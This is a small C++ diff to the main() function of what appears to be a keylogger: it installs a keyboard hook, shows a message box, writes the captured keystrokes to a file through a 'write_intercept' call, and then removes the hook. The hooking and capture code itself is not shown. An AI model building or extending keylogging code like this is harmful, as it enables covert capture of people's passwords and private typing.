@@ -14,12 +14,11 @@ int main()
         return 0;
 
     check = key_hook::create_hook();
-    if (check)
-        cout << "\n\n\t\tHooked\n\n";
-    else
+    if (!check)
         return 0;
 
-    MessageBoxW(NULL, L"hooking", L"", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
+    MessageBoxW(NULL, L"\t\tHooking\t\t", L"Close to close XD", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
+
     /*
     // in main release
     MSG m;
@@ -31,12 +30,11 @@ int main()
     //end main release
     //*/
 
-    check = file_handler::write(key_proc::captured);
+    check = file_handler::write_intercept(key_proc::captured.str());
+    key_proc::captured.str("");
 
     check = key_hook::delete_hook();
-    if (check)
-        cout << "\n\n\t\tUnHooked\n\n";
-    else
+    if (!check)
         return 0;
 
     return 0;
